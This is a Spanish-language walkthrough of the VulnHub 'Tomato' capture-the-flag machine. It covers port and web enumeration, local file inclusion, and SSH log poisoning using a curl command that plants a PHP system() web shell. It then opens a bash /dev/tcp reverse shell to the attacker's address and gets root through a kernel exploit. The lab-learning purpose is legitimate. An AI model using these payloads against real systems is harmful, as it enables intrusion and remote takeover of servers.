#ctf-machine #vulnhub #easy-machine #linux  [Vulnhub Link](https://www.vulnhub.com/entry/tomato-1,557/)

## Enumeración inicial
Para identificar la IPv4 de la máquina objetiva primeramente hacemos un escaneo ARP con `arp-scan`:
![[Pasted image 20240823112122.png]]

Como el OUI de la MAC es "00:0c" sabemos que se trata de la máquina objetiva, ya que las máquinas que se importan en VMWare contienen este OUI.

Para probablemente identificar el sistema operativo de la máquina, lanzamos una traza ICMP con `ping`:
![[Pasted image 20240823112359.png]]

Como el TTL = 64 podemos decir que probablemente se trate de una máquina Linux.

### Nmap
Por lo que hacemos un primer escaneo con `nmap` para detectar los puertos TCP abiertos de la máquina:
![[Pasted image 20240823112617.png]]

Como podemos ver hay 4 puertos abiertos, el puerto 21,80,2211 y 8888. Una vez identificados los puertos abiertos, hacemos un segundo escaneo con `nmap` para detectar la versión y servicio que corren para estos puertos:
![[Pasted image 20240823112828.png]]

Como podemos ver por el puerto 2211 se está ejecutando el servicio "OpenSSH 7.2p2" que es vulnerable a enumeración de usuarios:
![[Pasted image 20240823113059.png]]

## Enumeración web
Si accedemos a la web podemos ver una foto de un tomate 🍅:
![[Pasted image 20240823113312.png]]

Si hacemos fuzzing con `gobuster` y el diccionario "medium" en busca de directorios y archivos no encontramos nada interesante:
![[Pasted image 20240823114615.png]]

Si probamos otro diccionario con `gobuster` encontramos lo siguiente:
![[Pasted image 20240823120057.png]]

Si accedemos a `/antibot_image` podemos ver lo siguiente:
![[Pasted image 20240823122020.png]]

Si accedemos a `/antibot_image/antibots`:
![[Pasted image 20240823121936.png]]

Si accedemos a `/antibot_images/antibots/info.php` vemos el "phpinfo":
![[Pasted image 20240823122111.png]]

Sorprendentemente, si miramos el código fuente vemos un comentario 💀:
![[Pasted image 20240823122148.png]]

Por lo que si utilizamos este parámetro "image" y apuntamos a un archivo como `/etc/passwd` vemos el contenido en la web:
![[Pasted image 20240823122254.png]]

Por lo que podemos intentar hacer un *log poisoning* si podemos listar algún *log*. Si apuntamos a `/var/log/auth.log` podemos ver los *logs* de inicio de sesion con SSH:
![[Pasted image 20240823122439.png]]

Por lo que podemos generar un *log* con código PHP al intentar autenticarnos por SSH para conseguir RCE:
![[Pasted image 20240823124034.png]]
Pero como podemos ver las nuevas versiones SSH controlan que no se introduzcan carácteres inválidos por lo que buscando encontré esta alternativa:
https://stackoverflow.com/questions/77948173/how-to-perform-ssh-log-poisoning-for-rce-with-lfi-using-php-system-call-in-usern
```bash
curl -u '<?php system($_GET["cmd"]);?>' sftp://192.168.159.141:2211/anything -k
```

Por lo que si ejecutamos el comando "whoami" vemos que tenemos ejecución remota de comandos:
![[Pasted image 20240823124743.png]]

Por lo que podemos entablarnos una *reverse* *shell* introduciendo en el parámetro "cmd" el comando:
```bash
bash -c 'bash -i >& /dev/tcp/192.168.159.131/443 0>&1'
```

Y si nos ponemos en escucha con `nc` obtenemos acceso a la máquina:
![[Pasted image 20240823124938.png]]

Por lo tanto, hacemos el tratamiento de la TTY:
![[Pasted image 20240823125114.png]]
![[Pasted image 20240823125149.png]]

## Privilege escalation
Si listamos la versión de kernel del sistema podemos ver que se trata de la versión "Linux 4,4.0-21" por lo que si buscamos por *exploits* de kernel encontramos:
![[Pasted image 20240823150513.png]]

Por lo que si compilamos el código del *exploit*:
![[Pasted image 20240823150544.png]]

Y lo transferimos a la máquina víctima y lo ejecutamos obtenemos una `sh` con root:
![[Pasted image 20240823150659.png]]

Finalmente, si accedemos a `/root` podemos visualizar la *flag*:
![[Pasted image 20240823150746.png]]

___
#log-poisoning #local-file-inclusion #information-leakage #kernel-explotation #web-enumeration 
___